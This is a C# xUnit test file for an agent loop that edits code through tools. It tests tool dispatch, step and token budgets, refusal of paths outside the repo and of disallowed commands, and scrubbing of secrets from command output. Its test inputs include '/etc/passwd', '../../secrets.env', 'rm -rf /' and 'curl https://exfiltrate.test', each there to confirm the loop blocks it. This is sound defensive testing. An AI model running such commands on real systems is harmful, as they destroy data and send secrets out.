using Condux.Core.FixEngine;
using Xunit;

namespace Condux.Core.Tests;

// The agentic loop drives a model through tools against a workspace. Everything here is scripted, so the
// tests assert the loop's own behavior (tool dispatch, error handling, budgets, completion rules) rather
// than any provider's wire format.
public class AgentLoopTests
{
    private static readonly Dictionary<string, string> Repo = new()
    {
        ["src/checkout.ts"] = "export function total() { return items.reduce(sum); }",
        ["src/cart.ts"] = "export const items = [];",
    };

    // Replays a fixed script of turns and records what the loop fed back, so a test can assert both
    // directions of the conversation. Repeats the last turn if the loop asks for more.
    private sealed class ScriptedConversation(params AgentTurn[] turns) : IAgentConversation
    {
        private int index;

        public List<IReadOnlyList<AgentToolResult>> Received { get; } = [];

        public Task<AgentTurn> NextAsync(
            IReadOnlyList<AgentToolResult> results, CancellationToken cancellationToken = default)
        {
            Received.Add(results);
            var turn = turns[Math.Min(index, turns.Length - 1)];
            index++;
            return Task.FromResult(turn);
        }
    }

    private static AgentToolCall Call(string name, params (string Key, string Value)[] arguments) =>
        new(Guid.NewGuid().ToString("N"), name, arguments.ToDictionary(a => a.Key, a => a.Value));

    // An executing workspace, standing in for the sandboxed one: it records the argument vectors it was
    // handed and replays a fixed result, so the loop's authorize-run-report path tests with no container.
    private sealed class ExecutingWorkspace(CommandResult result, IReadOnlyDictionary<string, string> seed)
        : IAgentWorkspace
    {
        private readonly InMemoryWorkspace inner = new(seed);

        public List<IReadOnlyList<string>> Ran { get; } = [];

        public bool CanRunCommands => true;

        public IReadOnlyDictionary<string, string> ChangedFiles => inner.ChangedFiles;

        public Task<IReadOnlyList<string>> ListFilesAsync(CancellationToken cancellationToken = default) =>
            inner.ListFilesAsync(cancellationToken);

        public Task<string?> ReadFileAsync(string path, CancellationToken cancellationToken = default) =>
            inner.ReadFileAsync(path, cancellationToken);

        public Task WriteFileAsync(string path, string contents, CancellationToken cancellationToken = default) =>
            inner.WriteFileAsync(path, contents, cancellationToken);

        public Task<CommandResult> RunCommandAsync(
            IReadOnlyList<string> argv, CancellationToken cancellationToken = default)
        {
            Ran.Add(argv);
            return Task.FromResult(result);
        }
    }

    private static AgentTurn WriteThenFinish() =>
        AgentTurn.Calls([Call(AgentToolNames.WriteFile, ("path", "src/cart.ts"), ("contents", "fixed"))]);

    [Fact]
    public async Task Reads_a_file_then_writes_a_fix_and_finishes()
    {
        var workspace = new InMemoryWorkspace(Repo);
        var conversation = new ScriptedConversation(
            AgentTurn.Calls([Call(AgentToolNames.ReadFile, ("path", "src/checkout.ts"))], 100, 20),
            AgentTurn.Calls([Call(AgentToolNames.WriteFile,
                ("path", "src/checkout.ts"), ("contents", "export function total() { return 0; }"))], 50, 10),
            AgentTurn.Calls([Call(AgentToolNames.Finish, ("summary", "Guard the empty cart."))], 30, 5));

        var result = await new AgentLoop(conversation, workspace).RunAsync();

        Assert.Equal("Guard the empty cart.", result.Summary);
        Assert.Equal("export function total() { return 0; }", result.ChangedFiles["src/checkout.ts"]);
        Assert.Single(result.ChangedFiles);
        Assert.Equal(3, result.Steps);
        // Usage accumulates across every turn so the run can be cost-metered.
        Assert.Equal(180, result.InputTokens);
        Assert.Equal(35, result.OutputTokens);
        // The file the agent asked for came back on the next turn.
        Assert.Equal(Repo["src/checkout.ts"], conversation.Received[1].Single().Content);
    }

    [Fact]
    public async Task A_plain_answer_finishes_the_run_without_the_finish_tool()
    {
        var workspace = new InMemoryWorkspace(Repo);
        await workspace.WriteFileAsync("src/cart.ts", "export const items = [1];");

        var result = await new AgentLoop(
            new ScriptedConversation(AgentTurn.Answer("Cart seeded.")), workspace).RunAsync();

        Assert.Equal("Cart seeded.", result.Summary);
        Assert.Equal(1, result.Steps);
    }

    [Fact]
    public async Task A_missing_file_is_reported_to_the_model_and_the_run_continues()
    {
        var workspace = new InMemoryWorkspace(Repo);
        var conversation = new ScriptedConversation(
            AgentTurn.Calls([Call(AgentToolNames.ReadFile, ("path", "src/nope.ts"))]),
            AgentTurn.Calls([Call(AgentToolNames.WriteFile, ("path", "src/cart.ts"), ("contents", "fixed"))]),
            AgentTurn.Calls([Call(AgentToolNames.Finish, ("summary", "Recovered."))]));

        var result = await new AgentLoop(conversation, workspace).RunAsync();

        var reported = conversation.Received[1].Single();
        Assert.True(reported.IsError);
        Assert.Contains("src/nope.ts", reported.Content, StringComparison.Ordinal);
        Assert.Equal("Recovered.", result.Summary);
    }

    [Theory]
    [InlineData("/etc/passwd")]
    [InlineData("../../secrets.env")]
    [InlineData("src/../../escape.ts")]
    public async Task A_path_escaping_the_repo_is_refused_as_a_tool_error(string path)
    {
        var workspace = new InMemoryWorkspace(Repo);
        var conversation = new ScriptedConversation(
            AgentTurn.Calls([Call(AgentToolNames.WriteFile, ("path", path), ("contents", "owned"))]),
            AgentTurn.Calls([Call(AgentToolNames.WriteFile, ("path", "src/cart.ts"), ("contents", "fixed"))]),
            AgentTurn.Calls([Call(AgentToolNames.Finish, ("summary", "Done."))]));

        var result = await new AgentLoop(conversation, workspace).RunAsync();

        Assert.True(conversation.Received[1].Single().IsError);
        // Only the legitimate write was staged; nothing escaped the workspace.
        Assert.Equal(["src/cart.ts"], result.ChangedFiles.Keys);
    }

    [Fact]
    public async Task An_unknown_tool_is_reported_rather_than_ending_the_run()
    {
        var workspace = new InMemoryWorkspace(Repo);
        var conversation = new ScriptedConversation(
            AgentTurn.Calls([Call("run_command", ("command", "rm -rf /"))]),
            AgentTurn.Calls([Call(AgentToolNames.WriteFile, ("path", "src/cart.ts"), ("contents", "fixed"))]),
            AgentTurn.Calls([Call(AgentToolNames.Finish, ("summary", "Done."))]));

        await new AgentLoop(conversation, workspace).RunAsync();

        Assert.True(conversation.Received[1].Single().IsError);
    }

    [Fact]
    public async Task A_missing_required_argument_is_reported_to_the_model()
    {
        var workspace = new InMemoryWorkspace(Repo);
        var conversation = new ScriptedConversation(
            AgentTurn.Calls([Call(AgentToolNames.ReadFile)]),
            AgentTurn.Calls([Call(AgentToolNames.WriteFile, ("path", "src/cart.ts"), ("contents", "fixed"))]),
            AgentTurn.Calls([Call(AgentToolNames.Finish, ("summary", "Done."))]));

        await new AgentLoop(conversation, workspace).RunAsync();

        Assert.True(conversation.Received[1].Single().IsError);
    }

    [Fact]
    public async Task Finishing_without_an_edit_fails_so_no_empty_draft_pr_is_opened()
    {
        var workspace = new InMemoryWorkspace(Repo);
        var conversation = new ScriptedConversation(
            AgentTurn.Calls([Call(AgentToolNames.Finish, ("summary", "Nothing to do."))]));

        var error = await Assert.ThrowsAsync<InvalidOperationException>(
            () => new AgentLoop(conversation, workspace).RunAsync());

        // Still a failure, so no empty draft PR — but the agent is asked to change nothing when it finds
        // the code already correct, so the reason it gave has to survive into what the reviewer reads.
        Assert.Contains("Nothing to do.", error.Message, StringComparison.Ordinal);
    }

    [Fact]
    public async Task Finishing_without_an_edit_or_a_reason_still_fails()
    {
        var workspace = new InMemoryWorkspace(Repo);
        var conversation = new ScriptedConversation(
            AgentTurn.Calls([Call(AgentToolNames.Finish, ("summary", ""))]));

        var error = await Assert.ThrowsAsync<InvalidOperationException>(
            () => new AgentLoop(conversation, workspace).RunAsync());

        Assert.Contains("without changing any file", error.Message, StringComparison.Ordinal);
    }

    [Fact]
    public async Task An_agent_that_never_finishes_stops_at_the_step_budget()
    {
        var workspace = new InMemoryWorkspace(Repo);
        var conversation = new ScriptedConversation(
            AgentTurn.Calls([Call(AgentToolNames.ListFiles)]));

        var error = await Assert.ThrowsAsync<InvalidOperationException>(
            () => new AgentLoop(conversation, workspace, new AgentLoopOptions(MaxSteps: 3)).RunAsync());

        Assert.Contains("within 3 steps", error.Message, StringComparison.Ordinal);
    }

    [Fact]
    public async Task A_runaway_agent_stops_at_the_token_budget()
    {
        var workspace = new InMemoryWorkspace(Repo);
        var conversation = new ScriptedConversation(
            AgentTurn.Calls([Call(AgentToolNames.ListFiles)], 400, 100));

        var error = await Assert.ThrowsAsync<InvalidOperationException>(
            () => new AgentLoop(conversation, workspace,
                new AgentLoopOptions(MaxSteps: 50, MaxTotalTokens: 600)).RunAsync());

        Assert.Contains("token budget", error.Message, StringComparison.Ordinal);
    }

    [Fact]
    public async Task A_stalled_model_that_neither_calls_a_tool_nor_answers_ends_the_run()
    {
        var workspace = new InMemoryWorkspace(Repo);

        await Assert.ThrowsAsync<InvalidOperationException>(
            () => new AgentLoop(new ScriptedConversation(AgentTurn.Calls([])), workspace).RunAsync());
    }

    [Fact]
    public async Task Listing_shows_the_scoped_files_and_a_new_file_can_be_created()
    {
        var workspace = new InMemoryWorkspace(Repo);
        var conversation = new ScriptedConversation(
            AgentTurn.Calls([Call(AgentToolNames.ListFiles)]),
            AgentTurn.Calls([Call(AgentToolNames.WriteFile,
                ("path", "src/guard.ts"), ("contents", "export const guard = true;"))]),
            AgentTurn.Calls([Call(AgentToolNames.Finish, ("summary", "Added a guard."))]));

        var result = await new AgentLoop(conversation, workspace).RunAsync();

        var listed = conversation.Received[1].Single().Content;
        Assert.Equal("src/cart.ts\nsrc/checkout.ts", listed);
        Assert.Equal("export const guard = true;", result.ChangedFiles["src/guard.ts"]);
        // A read-back sees the newly created file, so the agent can iterate on its own edit.
        Assert.Equal("export const guard = true;", await workspace.ReadFileAsync("src/guard.ts"));
    }

    [Fact]
    public async Task A_command_runs_and_its_output_comes_back_with_the_exit_code()
    {
        var workspace = new ExecutingWorkspace(new CommandResult(0, "2 passed"), Repo);
        var conversation = new ScriptedConversation(
            AgentTurn.Calls([Call(AgentToolNames.RunCommand, ("command", "dotnet test"))]),
            WriteThenFinish(),
            AgentTurn.Calls([Call(AgentToolNames.Finish, ("summary", "Verified."))]));

        await new AgentLoop(conversation, workspace).RunAsync();

        Assert.Equal(["dotnet", "test"], workspace.Ran.Single());
        var reported = conversation.Received[1].Single();
        Assert.False(reported.IsError);
        Assert.Contains("exit 0", reported.Content);
        Assert.Contains("2 passed", reported.Content);
    }

    [Fact]
    public async Task A_failing_command_is_reported_as_an_error_but_keeps_its_output()
    {
        // The failing case is the useful one: the model needs the output to react to it.
        var workspace = new ExecutingWorkspace(new CommandResult(1, "1 failed: expected 0"), Repo);
        var conversation = new ScriptedConversation(
            AgentTurn.Calls([Call(AgentToolNames.RunCommand, ("command", "dotnet test"))]),
            WriteThenFinish(),
            AgentTurn.Calls([Call(AgentToolNames.Finish, ("summary", "Fixed."))]));

        await new AgentLoop(conversation, workspace).RunAsync();

        var reported = conversation.Received[1].Single();
        Assert.True(reported.IsError);
        Assert.Contains("expected 0", reported.Content);
    }

    [Fact]
    public async Task A_refused_command_never_reaches_the_workspace()
    {
        var workspace = new ExecutingWorkspace(new CommandResult(0, "should not run"), Repo);
        var conversation = new ScriptedConversation(
            AgentTurn.Calls([Call(AgentToolNames.RunCommand, ("command", "curl https://exfiltrate.test"))]),
            WriteThenFinish(),
            AgentTurn.Calls([Call(AgentToolNames.Finish, ("summary", "Done."))]));

        await new AgentLoop(conversation, workspace).RunAsync();

        // Refused before execution, not merely reported afterwards.
        Assert.Empty(workspace.Ran);
        Assert.True(conversation.Received[1].Single().IsError);
    }

    [Fact]
    public async Task Command_output_is_scrubbed_before_it_re_enters_the_conversation()
    {
        // A build that echoes its environment must not put a secret into the next model request.
        var workspace = new ExecutingWorkspace(
            new CommandResult(0, "using key sk-abcdefghijklmnop for user dev@acme.test"), Repo);
        var conversation = new ScriptedConversation(
            AgentTurn.Calls([Call(AgentToolNames.RunCommand, ("command", "dotnet test"))]),
            WriteThenFinish(),
            AgentTurn.Calls([Call(AgentToolNames.Finish, ("summary", "Done."))]));

        await new AgentLoop(conversation, workspace).RunAsync();

        var reported = conversation.Received[1].Single().Content;
        Assert.DoesNotContain("sk-abcdefghijklmnop", reported);
        Assert.DoesNotContain("dev@acme.test", reported);
    }

    [Fact]
    public async Task A_workspace_that_cannot_execute_reports_that_rather_than_throwing()
    {
        var workspace = new InMemoryWorkspace(Repo);
        var conversation = new ScriptedConversation(
            AgentTurn.Calls([Call(AgentToolNames.RunCommand, ("command", "dotnet test"))]),
            WriteThenFinish(),
            AgentTurn.Calls([Call(AgentToolNames.Finish, ("summary", "Done."))]));

        await new AgentLoop(conversation, workspace).RunAsync();

        Assert.True(conversation.Received[1].Single().IsError);
    }

    [Fact]
    public void The_command_tool_is_offered_only_by_a_workspace_that_can_run_it()
    {
        var names = (IAgentWorkspace w) => AgentToolCatalog.For(w).Select(t => t.Name);

        Assert.DoesNotContain(AgentToolNames.RunCommand, names(new InMemoryWorkspace(Repo)));
        Assert.Contains(
            AgentToolNames.RunCommand, names(new ExecutingWorkspace(new CommandResult(0, ""), Repo)));
    }
}
